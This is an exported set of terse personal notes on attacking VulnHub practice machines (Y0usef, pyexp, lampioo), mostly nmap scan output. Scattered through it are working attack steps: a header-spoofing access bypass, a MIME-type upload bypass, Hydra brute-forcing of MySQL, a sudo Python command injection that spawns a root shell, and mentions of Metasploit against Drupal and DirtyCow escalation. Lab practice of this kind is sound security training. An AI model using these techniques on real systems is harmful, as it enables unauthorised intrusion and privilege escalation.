href="https://github.com/jas502n/CVE-2019-1388/blob/master/HHUPD.EXE">https://github.com/jas502n/CVE-2019-1388/blob/master/HHUPD.EXE</a><br /><br /><br />a08422b9a99f07959afc130c8da02259<br /><br /></div><div class='page'><h1 class='title level-2'>Y0usef.vulnhub</h1><br/>PORT   STATE SERVICE VERSION                                                                                                   │===============================================================<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)                                           │2021/09/15 23:52:30 Finished<br />80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))                                                                            │===============================================================<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  <br /><br /><br />folder: administration found<br /><br />X-Forwarded-For:127.0.0.1<br /><br />go to uploads<br /><br />written wrong correct URL administration!<br /><br />upload intercept with burp upload.php and change image/jpg<br /><br />www-data@yousef-VirtualBox:/home$ ls -la<br />ls -la<br />total 16<br />drwxr-xr-x  3 root   root   4096 Dec  6  2020 .<br />drwxr-xr-x 22 root   root   4096 Mar 10  2021 ..<br />-rw-r--r--  1 root   root     53 Dec  8  2020 user.txt<br />drwxr-xr-x 17 yousef yousef 4096 Apr  7 19:02 yousef<br />www-data@yousef-VirtualBox:/home$ cat user.txt<br />cat user.txt<br />c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=<br /><br /><br />└─# echo &#39;c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=&#39; | base64 -d<br />ssh : <br />user : yousef <br />pass : yousef123 <br /><br />yousef@yousef-VirtualBox:~$ sudo -l<br />Matching Defaults entries for yousef on yousef-VirtualBox:<br />    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br /><br />User yousef may run the following commands on yousef-VirtualBox:<br />    (ALL : ALL) ALL<br /><br /><br />sudo su</div><div class='page'><h1 class='title level-2'>brainpan - oscplike.vulnhub</h1><br/></div><div class='page'><h1 class='title level-2'>pyexp.vulnhub</h1><br/>──(root💀kali)-[/home/kali]<br />└─# nmap -A -p- 192.168.80.118<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-29 21:13 +03<br />Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 5.96% done; ETC: 21:29 (0:14:43 remaining)<br />Stats: 0:15:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 90.16% done; ETC: 21:30 (0:01:40 remaining)<br />Stats: 0:17:26 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute<br />Traceroute Timing: About 32.26% done; ETC: 21:30 (0:00:00 remaining)<br />Nmap scan report for 192.168.80.118<br />Host is up (0.15s latency).<br />Not shown: 65533 closed ports<br />PORT     STATE SERVICE VERSION<br />1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 f7:af:6c:d1:26:94:dc:e5:1a:22:1a:64:4e:1c:34:a9 (RSA)<br />|   256 46:d2:8d:bd:2f:9e:af:ce:e2:45:5c:a6:12:c0:d9:19 (ECDSA)<br />|_  256 8d:11:ed:ff:7d:c5:a7:24:99:22:7f:ce:29:88:b2:4a (ED25519)<br />3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1<br />| mysql-info: <br />|   Protocol: 10<br />|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1<br />|   Thread ID: 42<br />|   Capabilities flags: 63486<br />|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, InteractiveClient, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, ODBCClient, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, FoundRows, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins<br />|   Status: Autocommit<br />|   Salt: 3|9G8#Es3B4y*^~&quot;*Ipx<br />|_  Auth Plugin Name: mysql_native_password<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/29%OT=1337%CT=1%CU=32814%PV=Y%DS=2%DC=T%G=Y%TM=60B28<br />OS:85E%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%II=I%TS=A)OPS(O1=<br />OS:M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7<br />OS:%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y<br />OS:%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD<br />OS:=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=<br />OS:)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G<br />OS:%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 111/tcp)<br />HOP RTT       ADDRESS<br />1   147.27 ms 192.168.49.1<br />2   147.76 ms 192.168.80.118<br /><br />Stats: 0:17:31 elapsed; 1 hosts completed (1 up), 0 undergoing Script Post-Scan<br />NSE Timing: About 0.00% done<br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1051.98 seconds<br /><br /><br /><br /><br /><br /><br />─# hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.80.118 -I -R<br />Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br /><br />[INFORMATION] reading restore file ./hydra.restore<br />[WARNING] options after -R are now honored (since v8.6)<br />Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-29 22:04:47<br />[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task<br />[DATA] attacking mysql://192.168.80.118:3306/<br />[STATUS] 8733.00 tries/min, 8733 tries in 00:01h, 14335666 to do in 27:22h, 4 active<br />[STATUS] 3095.67 tries/min, 9287 tries in 00:03h, 14335112 to do in 77:11h, 4 active<br />[3306][mysql] host: 192.168.80.118   login: root   password: prettywoman<br /><br /><br /><br />MariaDB [data]&gt; select * from fernet;<br />+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+<br />| cred                                                                                                                     | keyy                                         |<br />+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+<br />| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |<br />+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+<br /><br /><br />fernet decode<br /><a href="https://asecuritysite.com/encryption/ferdecode">https://asecuritysite.com/encryption/ferdecode</a><br />lucy:wJ9`&quot;Lemdv9[FEw-<br /><br /><br />lucy@pyexp:~$ sudo -l<br />Matching Defaults entries for lucy on pyexp:<br />    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br /><br />User lucy may run the following commands on pyexp:<br />    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py<br /><br /><br /><br />lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py<br />how are you?import os;os.system(&#39;/bin/bash&#39;)<br />root@pyexp:/home/lucy# whoami<br />root<br /></div><div class='page'><h1 class='title level-2'>lampioo.vulnhub</h1><br/>─# nmap -A -p- 192.168.170.48 <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-22 12:38 +03<br />Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 13.38% done; ETC: 12:55 (0:15:13 remaining)<br />Stats: 0:03:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 22.00% done; ETC: 12:55 (0:13:25 remaining)<br />Stats: 0:08:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 45.56% done; ETC: 12:55 (0:09:43 remaining)<br />Nmap scan report for 192.168.170.48<br />Host is up (0.15s latency).<br />Not shown: 65532 closed ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)<br />|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)<br />|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)<br />|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)<br />80/tcp   open  http?<br />| fingerprint-strings: <br />|   NULL: <br />|     _____ _ _ <br />|     |_|/ ___ ___ __ _ ___ _ _ <br />|     \x20| __/ (_| __ \x20|_| |_ <br />|     ___/ __| |___/ ___|__,_|___/__, ( ) <br />|     |___/ <br />|     ______ _ _ _ <br />|     ___(_) | | | |<br />|     \x20/ _` | / _ / _` | | | |/ _` | |<br />|_    __,_|__,_|_| |_|<br />1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br />|_http-generator: Drupal 7 (<a href="http://drupal.org">http://drupal.org</a>)<br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />|_http-title: Lampi\xC3\xA3o<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port80-TCP:V=7.91%I=7%D=5/22%Time=60A8D636%P=x86_64-pc-linux-gnu%r(NULL<br />SF:,1179,&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br />SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br />SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\|_\x20\x20\x20_\|\x20\|\x20\(\x<br />SF:20\)\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br />SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x<br />SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\n\x20\x20\|\x20\|\x20\|\x20\|_\|/\x20___\x20\x20\x20\x20___\x20\x20<br />SF:__\x20_\x20___\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br />SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n<br />SF:\x20\x20\|\x20\|\x20\|\x20__\|\x20/\x20__\|\x20\x20/\x20_\x20\\/\x20_`\<br />SF:x20/\x20__\|\x20\|\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20_\<br />SF:|\x20\|_\|\x20\|_\x20\x20\\__\x20\\\x20\|\x20\x20__/\x20\(_\|\x20\\__\x<br />SF:20\\\x20\|_\|\x20\|_\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br />SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\\___/\x20\\__\|<br />SF:\x20\|___/\x20\x20\\___\|\\__,_\|___/\\__,\x20\(\x20\)\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br />SF:\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br />SF:\x20\x20__/\x20\|/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x<br />SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|___/\x20\x20\x20\x20\x20\x<br />SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\n______\x20_\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x<br />SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br />SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\n\|\x20\x20___\(_\)\x20\x20\x<br />SF:20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br />SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br />SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\|\n\<br />SF:|\x20\|_\x20\x20\x20_\x20\x20\x20\x20__\|\x20\|_\x20\x20\x20_\x20_\x20_<br />SF:_\x20___\x20\x20\x20__\x20_\x20\x20\x20\x20___\x20\x20__\x20_\x20_\x20\<br />SF:x20\x20_\x20\x20__\x20_\|\x20\|\n\|\x20\x20_\|\x20\|\x20\|\x20\x20/\x20<br />SF:_`\x20\|\x20\|\x20\|\x20\|\x20&#39;_\x20`\x20_\x20\\\x20/\x20_`\x20\|\x20\x<br />SF:20/\x20_\x20\\/\x20_`\x20\|\x20\|\x20\|\x20\|/\x20_`\x20\|\x20\|\n\|\x2<br />SF:0\|\x20\x20\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|_\|\x20\|\x20\|\x20\|<br />SF:\x20\|\x20\|\x20\|\x20\(_\|\x20\|\x20\|\x20\x20__/\x20\(_\|\x20\|\x20\|<br />SF:_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\__<br />SF:,_\|_\|\x20\|_\|&quot;);<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/22%OT=22%CT=1%CU=35859%PV=Y%DS=2%DC=T%G=Y%TM=60A8D66<br />OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M<br />OS:506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%<br />OS:O6=M506ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%<br />OS:DF=Y%T=40%W=7210%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=<br />OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%<br />OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 443/tcp)<br />HOP RTT       ADDRESS<br />1   150.93 ms 192.168.49.1<br />2   151.85 ms 192.168.170.48<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1386.78 seconds<br /><br />zbarimg <br />wget <a href="http://192.168.170.48:1898/audio.m4a">http://192.168.170.48:1898/audio.m4a</a> <br /><br />user:tiago<br /><br />msfconsole drupal<br /><br />www-data<br /><br />settings.php ⇒ password  for tiaga<br /><br />dirtycow for priv esc</div>
</body>
</html>
